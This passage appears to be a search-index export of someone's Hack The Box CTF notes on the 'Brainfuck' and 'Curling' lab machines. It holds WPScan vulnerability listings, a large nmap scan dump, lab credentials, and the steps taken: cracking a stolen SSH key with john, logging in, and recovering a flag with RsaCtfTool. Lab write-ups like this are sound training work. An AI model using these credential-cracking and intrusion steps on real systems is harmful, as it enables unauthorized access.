https://wpvulndb.com/vulnerabilities/8699 | - https://www.exploit-db.com/exploits/40939/ | - http://lenonleite.com.br/en/blog/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/ | - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system | | [!] Title: WP Support Plus Responsive Ticket System = 8.0.7 - Remote Code Execution (RCE) | Fixed in: 8.0.8 | References: | - https://wpvulndb.com/vulnerabilities/8949 | - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system | | [!] Title: WP Support Plus Responsive Ticket System = 9.0.2 - Multiple Authenticated SQL Injection | Fixed in: 9.0.3 | References: | - https://wpvulndb.com/vulnerabilities/9041 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131 | - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md | - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system | | [!] Title: WP Support Plus Responsive Ticket System = 9.1.1 - Stored XSS | Fixed in: 9.1.2 | References: | - https://wpvulndb.com/vulnerabilities/9235 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299 | - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/ | - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system | | Version: 7.1.3 (100% confidence) | Detected By: Readme - Stable Tag (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt [+] Enumerating Config Backups Checking Config Backups - Time: 00:00:03 =========================================================================================================== (21 / 21) 100.00% Time: 00:00:03 [i] No Config Backups Found. [+] Finished: Tue Apr 23 07:33:00 2019 [+] Requests Done: 53 [+] Cached Requests: 4 [+] Data Sent: 10.006 KB [+] Data Received: 168.808 KB [+] Memory used: 86.762 MB [+] Elapsed time: 00:00:16","title":"CMS"},{"location":"ctf/hack-the-box/brainfuck/03_PostExploitation/Goodies/","text":"Hashes Password SMTP orestis@brainfuck.htb kHGuERB29DNiNE Forum telnet brainfuck.htb 143 a1 LOGIN orestis kHGuERB29DNiNE a2 LIST * a3 EXAMINE INBOX a4 FETCH 1 BODY[] a5 FETCH 2 BODY[] Hi there, your credentials for our secret forum are below :) username: orestis password: kIEnnfEKJ#9UmdO AES Key URL http://rumkin.com/tools/cipher/otp.php Orestis - Hacking for fun and profit Wejmvse - Fbtkqal zqb rso rnl cwihsf infuckm - ybrainf uck myb rai nfuckm http://rumkin.com/tools/cipher/vigenere.php There you go you stupid fuck, I hope you remember your key password because I dont :) https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa # python ssh2john.py id_rsa id_john # john id_john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa:3poulakia! Proof, Flags, Other $ ssh -i ~/HTB/brainfuck/id_rsa orestis@brainfuck.htb 2c11cfbc5b959f73ac15a3310bd097c9 encrypt.sage, debug.txt, output.txt RSA key generation works by computing: n = pq \u03c6 = (p-1)(q-1) d = (1/e) mod \u03c6 So given p, q, you can compute n and \u03c6 trivially via multiplication. From e and \u03c6 you can compute d, which is the secret key exponent. From there, your public key is [n, e] and your private key is [d, p, q]. Once you know those, you have the keys and can decrypt any messages - no cracking necessary! https://security.stackexchange.com/questions/25631/crack-plain-rsa-given-p-q-and-e http://www.di-mgt.com.au/rsa_alg.html $ python2.7 RsaCtfTool.py -p 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 -q 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 -e 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997 --uncipher 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182 [+] Clear text : 6efc1a5dbb8904751ce6566a305bb8ef","title":"Goodies"},{"location":"ctf/hack-the-box/brainfuck/03_PostExploitation/Goodies/#hashes","text":"","title":"Hashes"},{"location":"ctf/hack-the-box/brainfuck/03_PostExploitation/Goodies/#password","text":"","title":"Password"},{"location":"ctf/hack-the-box/brainfuck/03_PostExploitation/Goodies/#smtp","text":"orestis@brainfuck.htb kHGuERB29DNiNE","title":"SMTP"},{"location":"ctf/hack-the-box/brainfuck/03_PostExploitation/Goodies/#forum","text":"telnet brainfuck.htb 143 a1 LOGIN orestis kHGuERB29DNiNE a2 LIST * a3 EXAMINE INBOX a4 FETCH 1 BODY[] a5 FETCH 2 BODY[] Hi there, your credentials for our secret forum are below :) username: orestis password: kIEnnfEKJ#9UmdO","title":"Forum"},{"location":"ctf/hack-the-box/brainfuck/03_PostExploitation/Goodies/#aes-key-url","text":"http://rumkin.com/tools/cipher/otp.php Orestis - Hacking for fun and profit Wejmvse - Fbtkqal zqb rso rnl cwihsf infuckm - ybrainf uck myb rai nfuckm http://rumkin.com/tools/cipher/vigenere.php There you go you stupid fuck, I hope you remember your key password because I dont :) https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa # python ssh2john.py id_rsa id_john # john id_john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa:3poulakia!","title":"AES Key URL"},{"location":"ctf/hack-the-box/brainfuck/03_PostExploitation/Goodies/#proof-flags-other","text":"$ ssh -i ~/HTB/brainfuck/id_rsa orestis@brainfuck.htb 2c11cfbc5b959f73ac15a3310bd097c9 encrypt.sage, debug.txt, output.txt RSA key generation works by computing: n = pq \u03c6 = (p-1)(q-1) d = (1/e) mod \u03c6 So given p, q, you can compute n and \u03c6 trivially via multiplication. From e and \u03c6 you can compute d, which is the secret key exponent. From there, your public key is [n, e] and your private key is [d, p, q]. Once you know those, you have the keys and can decrypt any messages - no cracking necessary! https://security.stackexchange.com/questions/25631/crack-plain-rsa-given-p-q-and-e http://www.di-mgt.com.au/rsa_alg.html $ python2.7 RsaCtfTool.py -p 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 -q 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 -e 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997 --uncipher 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182 [+] Clear text : 6efc1a5dbb8904751ce6566a305bb8ef","title":"Proof, Flags, Other"},{"location":"ctf/hack-the-box/curling[ippsecpending]/Log/","text":"","title":"Log"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/Network/","text":"TCP nmap -sV -sC -oA nmap --script safe -T4 10.10.10.150 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-26 13:28 EDT Pre-scan script results: | broadcast-dhcp-discover: | Response 1 of 1: | IP Offered: 10.0.2.16 | Subnet Mask: 255.255.255.0 | Router: 10.0.2.2 | Domain Name Server: 10.0.2.3 |_ Server Identifier: 10.0.2.2 |_eap-info: please specify an interface with -e | targets-asn: |_ targets-asn.asn is a mandatory parameter Nmap scan report for 10.10.10.150 Host is up (0.30s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) |_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4 | ssh-hostkey: | 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA) | 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA) |_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519) | ssh2-enum-algos: | kex_algorithms: (10) | server_host_key_algorithms: (5) | encryption_algorithms: (6) | mac_algorithms: (10) |_ compression_algorithms: (2) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-auth-finder: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.150 | url method | http://10.10.10.150:80/ FORM | http://10.10.10.150:80/index.php/2-uncategorised/1-first-post-of-curling2018 FORM | http://10.10.10.150:80/index.php/component/users/?view=remind amp;Itemid=101 FORM | http://10.10.10.150:80/index.php/2-uncategorised/3-what-s-the-object-of-curling FORM | http://10.10.10.150:80/index.php/component/users/?view=reset amp;Itemid=101 FORM |_ http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true FORM | http-backup-finder: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.150 | http://10.10.10.150:80/index.php/2-uncategorised/index.bak | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018~ | http://10.10.10.150:80/index.php/2-uncategorised/index copy.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.1 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.~1~ | http://10.10.10.150:80/index.php/2-uncategorised/index.bak | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018~ | http://10.10.10.150:80/index.php/2-uncategorised/index copy.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.1 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.~1~ | http://10.10.10.150:80/index.php/2-uncategorised/index.bak | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling~ | http://10.10.10.150:80/index.php/2-uncategorised/index copy.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.1 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.~1~ | http://10.10.10.150:80/index.php/2-uncategorised/index.bak | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling~ | http://10.10.10.150:80/index.php/2-uncategorised/index copy.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.1 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.~1~ | http://10.10.10.150:80/index.php/2-uncategorised/index.bak | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true~ | http://10.10.10.150:80/index.php/2-uncategorised/index copy.php/2-uncategorised/2-curling-you-know-its-true | http://10.10.10.150:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/2-curling-you-know-its-true | http://10.10.10.150:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/2-curling-you-know-its-true | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.1 |_ http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.~1~ | http-comments-displayer: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.150 | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 55 | Comment: | !-- Begin Content -- | | Path: http://10.10.10.150:80/media/system/js/caption.js?4c6b364068a1c45e7cd3bb9b6a49b052 | Line number: 1 | Comment: | /* | GNU General Public License version 2 or later; see LICENSE.txt | */ | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 217 | Comment: | !-- End Right Sidebar -- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 42 | Comment: | !-- Header -- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 165 | Comment: | !-- Begin Right Sidebar -- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 29 | Comment: | !--[if lt IE 9] script src= /media/system/js/polyfill.event.js?4c6b364068a1c45e7cd3bb9b6a49b052 /script ![endif]-- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 222 | Comment: | !-- Footer -- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 27 | Comment: | !--[if lt IE 9] script src= /media/jui/js/html5.js?4c6b364068a1c45e7cd3bb9b6a49b052 /script ![endif]-- | | Path: http://10.10.10.150:80/index.php?format=feed amp;type=atom | Line number: 2 | Comment: | !-- generator= Joomla! - Open Source Content Management -- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 162 | Comment: | !-- End Content -- | | Path: http://10.10.10.150:80/media/jui/js/bootstrap.min.js?4c6b364068a1c45e7cd3bb9b6a49b052 | Line number: 1 | Comment: | /*! | * Bootstrap.js by @fat @mdo | * Copyright 2012 Twitter, Inc. | * http://www.apache.org/licenses/LICENSE-2.0.txt | * | * Custom version for Joomla! | */ | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 39 | Comment: | !-- Body -- | | Path: http://10.10.10.150:80/index.php/component/users/?view=reset amp;Itemid=101 | Line number: 29 | Comment: | !--[if lt IE 9] script src= /media/system/js/html5fallback.js?4c6b364068a1c45e7cd3bb9b6a49b052 /script ![endif]-- | | Path: http://10.10.10.150:80/templates/protostar/js/template.js?4c6b364068a1c45e7cd3bb9b6a49b052 | Line number: 1 | Comment: | /** | * @package Joomla.Site | * @subpackage Templates.protostar | * @copyright Copyright (C) 2005 - 2018 Open Source Matters, Inc. All rights reserved. | * @license GNU General Public License version 2 or later; see LICENSE.txt | * @since 3.2 | */ | | Path: http://10.10.10.150:80/media/jui/js/jquery-migrate.min.js?4c6b364068a1c45e7cd3bb9b6a49b052 | Line number: 1 | Comment: | /*! jQuery Migrate v1.4.1 | (c) jQuery Foundation and other contributors | jquery.org/license */ | | Path: http://10.10.10.150:80/media/jui/js/html5.js?4c6b364068a1c45e7cd3bb9b6a49b052 | Line number: 1 | Comment: | /** | * @preserve HTML5 Shiv 3.7.3 | @afarkas @jdalton @jon_neal @rem | MIT/GPL2 Licensed | */ | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 237 | Comment: |_ !-- secret.txt -- |_http-date: Fri, 26 Apr 2019 17:36:19 GMT; +6m13s from local time. |_http-fetch: Please enter the complete path of the directory to save data in. |_http-generator: Joomla! - Open Source Content Management | http-grep: | (1) http://10.10.10.150:80/: | (1) ip: |_ + 10.10.10.150 | http-headers: | Date: Fri, 26 Apr 2019 17:36:19 GMT | Server: Apache/2.4.29 (Ubuntu) | Set-Cookie: c0548020854924e0aecd05ed9f5b672b=omd5n9eo0uret9u3sj9ho7p07o; path=/; HttpOnly | Expires: Wed, 17 Aug 2005 00:00:00 GMT | Last-Modified: Fri, 26 Apr 2019 17:36:19 GMT | Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 | Pragma: no-cache | Connection: close | Content-Type: text/html; charset=utf-8 | |_ (Request type: HEAD) | http-internal-ip-disclosure: |_ Internal IP Leaked: 250 |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. | http-security-headers: | Cache_Control: | Header: Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 | Pragma: | Header: Pragma: no-cache | Expires: |_ Header: Expires: Wed, 17 Aug 2005 00:00:00 GMT |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Home | http-traceroute: | last-modified | Hop #1: Fri, 26 Apr 2019 17:36:15 GMT | Hop #2: Fri, 26 Apr 2019 17:36:16 GMT |_ Hop #3: Fri, 26 Apr 2019 17:36:17 GMT | http-useragent-tester: | Status for browser useragent: 200 | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 6m12s, deviation: 0s, median: 6m12s |_fcrdns: FAIL (No PTR record) |_ipidseq: All zeros |_path-mtu: PMTU == 1500 | qscan: | PORT FAMILY MEAN (us) STDDEV LOSS (%) | 1 0 397982.50 63132.29 0.0% | 22 1 327267.89 49047.70 10.0% |_80 0 349985.20 78775.50 0.0% Post-scan script results: | reverse-index: | 22/tcp: 10.10.10.150 |_ 80/tcp: 10.10.10.150 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 198.14 seconds UDP","title":"Network"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/Network/#tcp","text":"nmap -sV -sC -oA nmap --script safe -T4 10.10.10.150 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-26 13:28 EDT Pre-scan script results: | broadcast-dhcp-discover: | Response 1 of 1: | IP Offered: 10.0.2.16 | Subnet Mask: 255.255.255.0 | Router: 10.0.2.2 | Domain Name Server: 10.0.2.3 |_ Server Identifier: 10.0.2.2 |_eap-info: please specify an interface with -e | targets-asn: |_ targets-asn.asn is a mandatory parameter Nmap scan report for 10.10.10.150 Host is up (0.30s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) |_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4 | ssh-hostkey: | 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA) | 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA) |_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519) | ssh2-enum-algos: | kex_algorithms: (10) | server_host_key_algorithms: (5) | encryption_algorithms: (6) | mac_algorithms: (10) |_ compression_algorithms: (2) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-auth-finder: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.150 | url method | http://10.10.10.150:80/ FORM | http://10.10.10.150:80/index.php/2-uncategorised/1-first-post-of-curling2018 FORM | http://10.10.10.150:80/index.php/component/users/?view=remind amp;Itemid=101 FORM | http://10.10.10.150:80/index.php/2-uncategorised/3-what-s-the-object-of-curling FORM | http://10.10.10.150:80/index.php/component/users/?view=reset amp;Itemid=101 FORM |_ http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true FORM | http-backup-finder: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.150 | http://10.10.10.150:80/index.php/2-uncategorised/index.bak | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018~ | http://10.10.10.150:80/index.php/2-uncategorised/index copy.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.1 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.~1~ | http://10.10.10.150:80/index.php/2-uncategorised/index.bak | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018~ | http://10.10.10.150:80/index.php/2-uncategorised/index copy.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/1-first-post-of-curling2018 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.1 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.~1~ | http://10.10.10.150:80/index.php/2-uncategorised/index.bak | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling~ | http://10.10.10.150:80/index.php/2-uncategorised/index copy.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.1 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.~1~ | http://10.10.10.150:80/index.php/2-uncategorised/index.bak | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling~ | http://10.10.10.150:80/index.php/2-uncategorised/index copy.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/3-what-s-the-object-of-curling | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.1 | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.~1~ | http://10.10.10.150:80/index.php/2-uncategorised/index.bak | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true~ | http://10.10.10.150:80/index.php/2-uncategorised/index copy.php/2-uncategorised/2-curling-you-know-its-true | http://10.10.10.150:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/2-curling-you-know-its-true | http://10.10.10.150:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/2-curling-you-know-its-true | http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.1 |_ http://10.10.10.150:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.~1~ | http-comments-displayer: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.150 | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 55 | Comment: | !-- Begin Content -- | | Path: http://10.10.10.150:80/media/system/js/caption.js?4c6b364068a1c45e7cd3bb9b6a49b052 | Line number: 1 | Comment: | /* | GNU General Public License version 2 or later; see LICENSE.txt | */ | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 217 | Comment: | !-- End Right Sidebar -- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 42 | Comment: | !-- Header -- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 165 | Comment: | !-- Begin Right Sidebar -- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 29 | Comment: | !--[if lt IE 9] script src= /media/system/js/polyfill.event.js?4c6b364068a1c45e7cd3bb9b6a49b052 /script ![endif]-- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 222 | Comment: | !-- Footer -- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 27 | Comment: | !--[if lt IE 9] script src= /media/jui/js/html5.js?4c6b364068a1c45e7cd3bb9b6a49b052 /script ![endif]-- | | Path: http://10.10.10.150:80/index.php?format=feed amp;type=atom | Line number: 2 | Comment: | !-- generator= Joomla! - Open Source Content Management -- | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 162 | Comment: | !-- End Content -- | | Path: http://10.10.10.150:80/media/jui/js/bootstrap.min.js?4c6b364068a1c45e7cd3bb9b6a49b052 | Line number: 1 | Comment: | /*! | * Bootstrap.js by @fat @mdo | * Copyright 2012 Twitter, Inc. | * http://www.apache.org/licenses/LICENSE-2.0.txt | * | * Custom version for Joomla! | */ | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 39 | Comment: | !-- Body -- | | Path: http://10.10.10.150:80/index.php/component/users/?view=reset amp;Itemid=101 | Line number: 29 | Comment: | !--[if lt IE 9] script src= /media/system/js/html5fallback.js?4c6b364068a1c45e7cd3bb9b6a49b052 /script ![endif]-- | | Path: http://10.10.10.150:80/templates/protostar/js/template.js?4c6b364068a1c45e7cd3bb9b6a49b052 | Line number: 1 | Comment: | /** | * @package Joomla.Site | * @subpackage Templates.protostar | * @copyright Copyright (C) 2005 - 2018 Open Source Matters, Inc. All rights reserved. | * @license GNU General Public License version 2 or later; see LICENSE.txt | * @since 3.2 | */ | | Path: http://10.10.10.150:80/media/jui/js/jquery-migrate.min.js?4c6b364068a1c45e7cd3bb9b6a49b052 | Line number: 1 | Comment: | /*! jQuery Migrate v1.4.1 | (c) jQuery Foundation and other contributors | jquery.org/license */ | | Path: http://10.10.10.150:80/media/jui/js/html5.js?4c6b364068a1c45e7cd3bb9b6a49b052 | Line number: 1 | Comment: | /** | * @preserve HTML5 Shiv 3.7.3 | @afarkas @jdalton @jon_neal @rem | MIT/GPL2 Licensed | */ | | Path: http://10.10.10.150:80/index.php/2-uncategorised/2-curling-you-know-its-true | Line number: 237 | Comment: |_ !-- secret.txt -- |_http-date: Fri, 26 Apr 2019 17:36:19 GMT; +6m13s from local time. |_http-fetch: Please enter the complete path of the directory to save data in. |_http-generator: Joomla! - Open Source Content Management | http-grep: | (1) http://10.10.10.150:80/: | (1) ip: |_ + 10.10.10.150 | http-headers: | Date: Fri, 26 Apr 2019 17:36:19 GMT | Server: Apache/2.4.29 (Ubuntu) | Set-Cookie: c0548020854924e0aecd05ed9f5b672b=omd5n9eo0uret9u3sj9ho7p07o; path=/; HttpOnly | Expires: Wed, 17 Aug 2005 00:00:00 GMT | Last-Modified: Fri, 26 Apr 2019 17:36:19 GMT | Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 | Pragma: no-cache | Connection: close | Content-Type: text/html; charset=utf-8 | |_ (Request type: HEAD) | http-internal-ip-disclosure: |_ Internal IP Leaked: 250 |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. | http-security-headers: | Cache_Control: | Header: Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 | Pragma: | Header: Pragma: no-cache | Expires: |_ Header: Expires: Wed, 17 Aug 2005 00:00:00 GMT |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Home | http-traceroute: | last-modified | Hop #1: Fri, 26 Apr 2019 17:36:15 GMT | Hop #2: Fri, 26 Apr 2019 17:36:16 GMT |_ Hop #3: Fri, 26 Apr 2019 17:36:17 GMT | http-useragent-tester: | Status for browser useragent: 200 | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 6m12s, deviation: 0s, median: 6m12s |_fcrdns: FAIL (No PTR record) |_ipidseq: All zeros |_path-mtu: PMTU == 1500 | qscan: | PORT FAMILY MEAN (us) STDDEV LOSS (%) | 1 0 397982.50 63132.29 0.0% | 22 1 327267.89 49047.70 10.0% |_80 0 349985.20 78775.50 0.0% Post-scan script 